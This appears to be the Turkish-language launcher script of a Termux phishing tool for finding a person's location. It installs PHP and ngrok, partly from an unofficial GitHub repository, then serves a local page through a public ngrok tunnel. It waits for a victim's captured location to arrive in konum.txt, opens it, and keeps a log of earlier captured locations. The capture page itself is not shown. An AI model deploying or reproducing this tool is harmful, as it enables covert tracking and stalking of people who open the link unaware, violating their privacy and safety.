#!/bin/bash

if [[ $1 == güncelle ]];then
	cd files
	bash güncelleme.sh güncelle
	exit
fi

#################### CURL ####################
kontrol=$(which curl |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m CURL PAKETİ KURLUYOR"
	echo
	echo
	echo
	pkg install curl -y
fi
#################### PHP ####################
if [[ -a /data/data/com.termux/files/usr/bin/php ]];then
	echo
else
	echo
	echo
	echo
	printf "\e[32m[*] \e[0mPHP PAKETİ KURULUYOR "
	echo
	echo
	echo
	pkg install php -y
fi

#################### NGROK ####################
kontrol=$(which ngrok |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
	echo
	echo
	echo
	git clone https://github.com/termuxxtoolss/ngrok-kurulum
	cd ngrok-kurulum
	bash ngrok-kurulum.sh
	cd ..
	chmod 777 /data/data/com.termux/files/usr/bin/ngrok
	rm -rf ngrok-kurulum

fi

#################### BULUNAN KONUM ADRESİ ####################
bulunan () {
if [[ -e "eskikonum.txt" ]]; then
	kontrol=$(cat eskikonum.txt |wc -w)
	if [[ $kontrol -gt 0 ]];then
		echo
		printf "\e[32m [✓] \e[97mBULUNAN KONUM ADRESİ \e[31m>> \e[0m "
		satir=$(cat eskikonum.txt |wc -w)
		sed -n $satir\p eskikonum.txt
	fi
fi
}

#################### URL BULMA DÖNGÜSÜ ####################

url() {
	while true;
	do
		if [[ -e "konum.txt" ]]; then
			link=$(cat konum.txt)
			xdg-open $link
			rm konum.txt
			kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -o ngrok)
			if [[ $kontrol == ngrok ]];then
				killall ngrok
				killall php
			fi
			break


		fi
	done


}

#################### MENÜ ###################

cd files
bash güncelleme.sh
bash banner.sh
function finish() {
	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -o ngrok)
	if [[ $kontrol == ngrok ]];then
		killall ngrok
		killall php
	fi
	exit
}
stty susp ""
stty eof ""
trap finish SIGINT
bulunan
printf "

\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mBAŞLAT\e[97m

\e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mBULUNAN ESKİ KONUMLAR\e[97m

\e[31m[\e[97m3\e[31m]\e[97m ────────── \e[32mNGROK GÜNCELLE\e[97m

\e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[0m
"
echo
echo
echo
read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
if [ $secim == 1 ];then
	kontrol=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"' |wc -l)
	if [[ $kontrol == 0 ]];then
		bash index.sh -bg -p 4444
		echo
		echo
		echo
		sleep 3
		printf "\e[33m[*]\e[97m KONUM BULUNDUĞUNDA OTOMATİK OLARAK SİZİ KONUMA YÖNLENDİRECEK.."
		echo
		echo
		echo
		echo
		sleep 2
		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
		echo
		echo
		echo
		url
		cd ..
		bash konum-bulma.sh
	else
		echo
		echo
		echo
		printf "\e[33m[*] \e[97mESKİ BAĞLANTINIZ DEVAM EDİYOR"
		echo
		echo
		echo
		sleep 1
		printf "LİNK \e[31m>>\e[97m "
		curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"'
		echo
		echo
		echo
		sleep 3
		printf "\e[33m[*]\e[97m LÜTFEN BEKLEYİN.."
		echo
		echo
		echo
		sleep 3
		printf "\e[33m[*]\e[97m KONUM BULUNDUĞUNDA OTOMATİK OLARAK SİZİ KONUMA YÖNLENDİRECEK.."
		echo
		echo
		echo
		echo
		sleep 2
		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
		echo
		echo
		echo
		url
		cd ..
		bash konum-bulma.sh
	fi

elif [[ $secim == x || $secim == X ]];then
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m ÇIKIŞ YAPILDI\e[31m !!!\e[0m"
	echo
	echo
	echo
	exit
elif [[ $secim == k || $secim == K ]];then
	cd ..
	kontrol=$(ps aux |grep "php" |grep -v grep |grep -v index |awk '{print $2}' |wc -l)
	if [[ $kontrol == 1 ]];then
		killall php
		echo
		echo
		echo
		printf "\e[32m[✓] \e[33mPHP\e[97m ARKAPLANDAN KAPATILDI"
		echo
		echo
		echo
	else
		echo
		echo
		echo
		printf "\e[31m[*] \e[33mPHP\e[97m ARKAPLANDA ÇALIŞMIYOR"
		echo
		echo
		echo
	fi
	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -v index |awk '{print $2}' |wc -l)
	if [[ $kontrol == 1 ]];then
		killall ngrok
		echo
		echo
		echo
		printf "\e[32m[✓] \e[33mNGROK\e[97m ARKAPLANDAN KAPATILDI"
		echo
		echo
		echo
		sleep 2
		bash konum-bulma.sh
		exit
	else
		echo
		echo
		echo
		printf "\e[31m[*] \e[33mNGROK\e[97m ARKAPLANDA ÇALIŞMIYOR"
		echo
		echo
		echo
		sleep 2
		bash konum-bulma.sh
		exit
	fi
elif [ $secim == 2 ];then
	if [[ -a eskikonum.txt ]];then
		kontrol=$(cat eskikonum.txt |wc -w)
		if [[ $kontrol -gt 0 ]];then
			echo
			echo
			echo
			printf "\e[32m$(cat eskikonum.txt)\e[97m"
			echo
			echo
			echo
			printf "\e[33mESKİ KONUMLAR SİLİNSİN Mİ ? \e[97m[ \e[32mE\e[97m / \e[31mH\e[97m ]"
			echo
			echo
			read -e -p $'\e[97m SEÇENEK GİRİNİZ \e[31m>>\e[97m ' sil
			if [[ $sil == e || $sil == E ]];then
				rm eskikonum.txt
				touch eskikonum.txt
				echo
				echo
				echo
				printf "\e[32m[✓]\e[97m ESKİ KONUMLAR SİLİNDİ"
				echo
				echo
				echo
				cd ..
				sleep 2
				bash konum-bulma.sh
			elif [[ $sil == h || $sil == H ]];then
				echo
				echo
				echo
				printf "\e[33m[*]\e[97m ESKİ KONUM SİLME İPTAL EDİLDİ"
				echo
				echo
				echo
				cd ..
				sleep 2
				bash konum-bulma.sh
			else
				echo
				echo
				echo
				printf "\e[32m[!]\e[97m HATALI SEÇİM \e[31m!!!\e[97m"
				echo
				echo
				echo
				echo
				cd ..
				sleep 2
				bash konum-bulma.sh
			fi
		else
			echo
			echo
			echo
			printf "\e[33m[*]\e[97m KAYITLI ESKİ KONUM BULUNAMADI"
			echo
			echo
			echo
			cd ..
			sleep 2
			bash konum-bulma.sh
			


		fi

	fi
elif [ $secim == 3 ];then
	echo
	echo
	echo
	printf "\e[32m
	[1]\e[97m NGROK VERSİON 2.2.6\e[32m

	[2]\e[97m NGROK GÜNCEL VERSİON
	"
	echo
	echo
	echo
	read -e -p $'\e[97m SEÇENEK GİRİNİZ \e[31m>>\e[97m ' sec
	if [[ $sec == 1 ]];then
		git clone https://github.com/termuxxtoolss/ngrok
		mv ngrok/ngrok /data/data/com.termux/files/usr/bin
		chmod 777 /data/data/com.termux/files/usr/bin/ngrok
		rm -rf ngrok
		echo
		echo
		echo
		printf "\e[32m[✓] \e[97mNGROK VERSİON 2.2.6 KURULUMU TAMAMLANDI"
		echo
		echo
		echo
		sleep 2
		cd ..
		bash konum-bulma.sh
	elif [[ $sec == 2 ]];then
		wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
		unzip ngrok-stable-linux-arm.zip
		rm -rf ngrok-stable-linux-arm.zip
		mv ngrok /data/data/com.termux/files/usr/bin
		chmod 777 /data/data/com.termux/files/usr/bin/ngrok
		echo
		echo
		echo
		printf "\e[32m[✓] \e[97mNGROK GÜNCEL VERSİON KURULUMU TAMAMLANDI"
		echo
		echo
		echo
		sleep 2
		cd ..
		bash konum-bulma.sh
	else
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m HATALI SEÇİM \e[31m!!!\e[0m"
		echo
		echo
		echo
		cd ..
		sleep 2
		bash konum-bulma.sh
	fi
else
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m HATALI SEÇİM \e[31m!!!\e[0m"
	echo
	echo
	echo
	cd ..
	sleep 2
	bash konum-bulma.sh
fi
